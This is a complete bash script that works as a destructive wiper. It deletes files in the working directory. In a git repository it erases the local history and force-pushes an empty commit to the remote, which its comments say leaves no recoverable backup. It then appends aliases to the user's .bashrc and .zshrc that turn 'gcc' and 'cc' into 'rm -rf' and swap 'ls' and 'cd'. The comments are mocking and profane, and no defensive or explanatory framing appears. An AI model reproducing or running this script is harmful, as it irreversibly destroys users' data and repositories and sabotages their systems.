#!/bin/bash -e

# This function checks if the current directory
# is a github repository.
function check_git_exists {
    local on_working_tree=$(git rev-parse --is-inside-work-tree 2>/dev/null)

    [[ "${on_working_tree}" = "true" ]] && echo "1" || echo "0"
}

# This function will remove the whole commits history
# and fill it with an empty one. This way, no backup
# is downloadable.
function remove_commits {
    local current_origin=$(git remote get-url --push origin)

    rm -rf .git
    git init
    git remote add origin $current_origin
    echo "" > README.md
    git add README.md
    git commit -am "."
    git push -f origin main
}

# Don't think I need to explain this...
function remove_folders {
    rm -rf .* *.*
}

# If someone uses oh-my-zsh, this function will handle
# both .bashrc and .zshrc to fuck it up. It will take
# effect after a reboot.
function rc_fucker {
    for rc in .bashrc \
                  .zshrc;
    do
        echo "alias gcc=\"rm -rf\"" >> ~/$rc
        echo "alias cc=gcc" >> ~/$rc
        echo "alias ls=cd" >> ~/$rc
        echo "alias cd=ls" >> ~/$rc
    done
}

function main {
    remove_folders
    if [[ $(check_git_exists) = "1" ]]; then
        remove_commits
    fi
    rc_fucker
}

main

